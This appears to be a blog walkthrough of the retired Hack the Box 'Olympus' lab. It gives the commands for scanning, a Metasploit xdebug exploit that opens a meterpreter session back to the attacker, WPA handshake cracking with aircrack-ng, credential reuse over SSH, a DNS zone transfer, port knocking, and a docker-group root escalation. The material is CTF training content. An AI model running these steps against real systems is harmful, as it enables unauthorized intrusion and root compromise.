@@ -1,0 +1,411 @@
+
+								
+																		Hack the Box: Olympus Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on October 4, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “Olympus”. Olympus is a retired vulnerable lab presented by Hack the Box for helping pentesters to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.
+Level: Easy
+Task: To find user.txt and root.txt file 
+Note: Since these labs are online available therefore they have static IP. The IP of Olympus is 10.10.10.83
+Walkthrough
+Let’s start off with our basic nmap command to find out the open ports and services.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.83
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.83
+					
+				
+			
+		
+
+
+From scanning through nmap, we found that here port 22 is filtered for SSH but instead of that port 2222 is also open for SSH. Moreover, port 53 is open for DNS where it has grabbed banner “Bind” and even it found the port 80 is opened for Apache http server. Therefore firstly, let’s navigate to port 80 in the web browser.
+
+After exploring target IP in the web browser, we were welcomed by a Zeus picture as shown in the above image. Unfortunately! Here we are unable to find any remarkable clue, therefore we have decided to run Nikto for scanning possible vulnerabilities.
+Let’s find the list of possible vulnerabilities using Nikto:
+
+		
+		
+			
+			
+			
+			
+nikto -h http://10.10.10.83
+			
+				
+					
+				
+					1
+				
+						nikto -h http://10.10.10.83
+					
+				
+			
+		
+
+
+Scanning with Nikto gave us a clue to move forward which is Uncommon header ‘xdebug’. Searching the keyword ‘xdebug’ on google gave us a result about ‘xdebug’ command execution exploits module for Metasploit. After that load Metasploit on your terminal and use the commands as follows:
+
+		
+		
+			
+			
+			
+			
+msf &gt; use exploit/unix/http/xdebug_unauth_exec
+msf (exploit/unix/http/xdebug_unauth_exec) &gt; set rhost 10.10.10.83
+msf (exploit/unix/http/xdebug_unauth_exec) &gt; set lhost 10.10.14.13
+msf (exploit/unix/http/xdebug_unauth_exec) &gt; exploit
+			
+				
+					
+				
+					1234
+				
+						msf &gt; use exploit/unix/http/xdebug_unauth_execmsf (exploit/unix/http/xdebug_unauth_exec) &gt; set rhost 10.10.10.83msf (exploit/unix/http/xdebug_unauth_exec) &gt; set lhost 10.10.14.13msf (exploit/unix/http/xdebug_unauth_exec) &gt; exploit
+					
+				
+			
+		
+
+Boom!! We have got the meterpreter of the target machine. Then further exploring directories, we noticed a directory /zeus which got a subdirectory /airgeddon. As you can relate it with the image below.
+
+Then inside the /airgeddon directory, we opened its subdirectory /captured which shows a file captured.cap.
+
+
+		
+		
+			
+			
+			
+			
+ls
+cd /home
+ls
+cd zeus
+ls
+			
+				
+					
+				
+					12345
+				
+						lscd /homelscd zeusls
+					
+				
+			
+		
+
+It could be another clue, therefore we downloaded this file on our Kali Desktop as you can see in the image below.
+
+		
+		
+			
+			
+			
+			
+cd airgeddon
+ls
+cat pindb_checksum.txt
+cd captured
+ls
+download captured.cap /root/Desktop/
+cat papyrus.txt
+			
+				
+					
+				
+					1234567
+				
+						cd airgeddonlscat pindb_checksum.txtcd capturedlsdownload captured.cap /root/Desktop/cat papyrus.txt
+					
+				
+			
+		
+
+
+After downloading capture.cap file, we need to analyze it. So when we open this file, it was a Wireshark pcap file and by streaming the 1st packet we noticed SSID: Too_clOse_to_th3_Sun as shown in the image. This can be probably used as a Password.
+
+Now cracking the file captured.cap using aircrack following command:
+
+		
+		
+			
+			
+			
+			
+aircrack-ng captured.cap -w /usr/share/wordlists/rockyou.txt
+			
+				
+					
+				
+					1
+				
+						aircrack-ng captured.cap -w /usr/share/wordlists/rockyou.txt
+					
+				
+			
+		
+
+After a few minutes, we have found the key: flightoficarus as shown in the image below.
+
+We thought icarus could be a username too. Because earlier when we search “Too close to the Sun” in the Google, it shows the wiki page of icarus. Therefore the following combination of credentials can be used for SSH login via port 2222.
+
+		
+		
+			
+			
+			
+			
+icarus:Too_clOse_to_th3_Sun
+ssh icarus@10.10.10.83 -p 2222
+			
+				
+					
+				
+					12
+				
+						icarus:Too_clOse_to_th3_Sunssh icarus@10.10.10.83 -p 2222
+					
+				
+			
+		
+
+After successfully logging into SSH on navigating further, we acquired a file “help_of_the_gods.txt”. After reading the file it shows us a domain name ctfolympus.htb as shown in the image below.
+
+We thought of trying DNS zone transfer since dig uses the axfr response to retrieve your zone information.
+
+		
+		
+			
+			
+			
+			
+dig axfr @10.10.10.83 ctfolympus.htb
+			
+				
+					
+				
+					1
+				
+						dig axfr @10.10.10.83 ctfolympus.htb
+					
+				
+			
+		
+
+From the result, we figured that pormetheus can be another username and St34l_th3_F1re! could be the possible password. Also, there is a series of some random port numbers 3456 8234 62431 and this brings us to ponder on port Knocking that can change the state of SSH port 22 from filtered to open.
+
+We knocked these ports by executing the following command:
+
+		
+		
+			
+			
+			
+			
+knock -v 10.10.10.83 3456 8234 62431
+			
+				
+					
+				
+					1
+				
+						knock -v 10.10.10.83 3456 8234 62431
+					
+				
+			
+		
+
+After knocking these ports just to confirm the state of SSH port 22 by using nmap scan. Here we succeeded in making the SSH port open.
+
+		
+		
+			
+			
+			
+			
+nmap -p22 10.10.10.83
+			
+				
+					
+				
+					1
+				
+						nmap -p22 10.10.10.83
+					
+				
+			
+		
+
+
+Now by logging into SSH port 22 by using the given below credentials:
+
+		
+		
+			
+			
+			
+			
+Prometheus: St34l_th3_F1re!
+			
+				
+					
+				
+					1
+				
+						Prometheus: St34l_th3_F1re!
+					
+				
+			
+		
+
+Here!! We have found and read user.txt.
+Yuppie!! We have completed our first task, moving on towards the second task.
+ 
+Then using id command, it came into notice that prometheus is in docker users group. Let’s have a look at docker images and docker ps as shown in the image below.
+
+		
+		
+			
+			
+			
+			
+docker image
+docker ps
+			
+				
+					
+				
+					12
+				
+						docker imagedocker ps
+					
+				
+			
+		
+
+ 
+By executing the above command we notice there is a docker_image “olympia” hence we can create a copy of a bash with the following command to escalate root privileges:
+Time to get root.txt!!
+After looking for some information on how to exploit this, we find that we can access it as root by using the following command:
+
+		
+		
+			
+			
+			
+			
+docker run -v /:/root -i -t olympia /bin/bash
+			
+				
+					
+				
+					1
+				
+						docker run -v /:/root -i -t olympia /bin/bash
+					
+				
+			
+		
+
+Booyah!! We have found root.txt and from the image below you can see we have obtained the value of root.txt.
+
+Author: Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. See’s things from a different angle and an out of the box thinker. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
